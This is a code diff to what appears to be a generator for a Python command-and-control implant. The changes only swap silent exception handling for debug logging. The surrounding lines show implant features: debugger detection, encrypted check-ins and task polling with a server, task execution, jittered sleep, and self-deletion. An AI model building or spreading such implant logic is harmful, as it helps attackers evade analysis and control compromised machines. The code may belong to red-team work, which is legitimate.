@@ -185,8 +185,8 @@ def generate_python_implant(
                                 pid = int(line.split(":")[1].strip())
                                 if pid != 0:
                                     return True
-                except Exception:
-                    pass
+                except Exception as _exc:
+                    logging.debug(f"Suppressed in python_implant.py: {_exc}")
 
             # Timing check: debuggers slow down execution
             start = time.monotonic()
@@ -284,7 +284,7 @@ def generate_python_implant(
                 for i in range(len(key_mut)):
                     key_mut[i] = 0
                 return True
-            except Exception:
+            except Exception as e:
                 return False
 
 
@@ -355,7 +355,7 @@ def generate_python_implant(
                     if "data" in resp_data:
                         _decrypt_aes_gcm(_session_key, resp_data["data"])
                     return True
-                except Exception:
+                except Exception as e:
                     continue
             return False
 
@@ -393,7 +393,7 @@ def generate_python_implant(
                         dec = _decrypt_aes_gcm(_session_key, resp_data["data"])
                         tasks_data = json.loads(dec)
                         return tasks_data.get("tasks", [])
-                except Exception:
+                except Exception as e:
                     continue
             return []
 
@@ -462,8 +462,8 @@ def generate_python_implant(
             # Delete self
             try:
                 os.remove(_self_path)
-            except Exception:
-                pass
+            except Exception as _exc:
+                logging.debug(f"Suppressed in python_implant.py: {_exc}")
             sys.exit(0)
 
 
@@ -544,8 +544,8 @@ def generate_python_implant(
                     for task in tasks:
                         result = _process_task(task)
                         pending_results.append(result)
-                except Exception:
-                    pass
+                except Exception as _exc:
+                    logging.debug(f"Suppressed in python_implant.py: {_exc}")
                 _sleep_with_jitter()
 
 
